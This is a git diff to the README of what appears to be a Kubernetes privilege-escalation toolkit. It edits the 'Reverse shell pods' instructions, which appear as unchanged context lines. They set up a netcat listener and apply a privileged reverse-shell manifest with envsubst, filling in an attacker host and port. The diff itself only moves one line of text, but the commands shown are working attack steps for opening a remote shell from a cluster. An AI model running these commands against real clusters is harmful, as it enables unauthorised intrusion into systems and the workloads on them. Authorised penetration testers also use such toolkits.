@@ -61,16 +61,15 @@ kubectl describe priv-exec-[RESOURCE_TYPE]
 ## Reverse shell pods
 Create one or more of these resources and catch the reverse shell
 
-**Generic resource type creation example**
-
-Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
-
 **Step 1: Set up listener**
 ```bash
 nc -nvlp 3116
 ```
 
 **Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**
+
+Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+
 ```bash
 HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/priv/[RESOURCE_TYPE]/priv-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
 ```
